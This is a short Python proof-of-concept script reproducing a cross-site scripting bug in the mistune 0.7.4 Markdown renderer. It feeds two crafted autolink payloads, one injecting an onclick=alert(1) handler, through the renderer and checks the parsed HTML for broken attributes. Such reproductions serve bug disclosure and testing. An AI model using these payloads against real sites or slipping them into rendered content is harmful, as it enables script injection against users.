#!/usr/bin/env python3
# Minimal repro for the mistune autolink xss.
# Install:  pip install 'mistune==0.7.4' beautifulsoup4 html5lib
# Run:      python val/repro.py

import mistune
from bs4 import BeautifulSoup

smallest = '<a:"x=y>'             # 8 bytes, trips the harness
full_xss = '<a:"onclick=alert(1)>'  # 21 bytes, live onclick handler

for payload in (smallest, full_xss):
    html = mistune.Markdown()(payload).rstrip()
    print(f'markdown: {payload!r}')
    print(f'html:     {html}')

    soup = BeautifulSoup(html, 'html5lib')
    a = soup.find('a')
    if a is not None:
        print(f'parsed:   <a {dict(a.attrs)}>')

    for tag in soup.find_all(True):
        for attr, val in tag.attrs.items():
            if isinstance(val, list):
                val = ' '.join(val)
            if val and '"' in val:
                print(f'HIT:      <{tag.name} {attr}="{val}">')
    print()
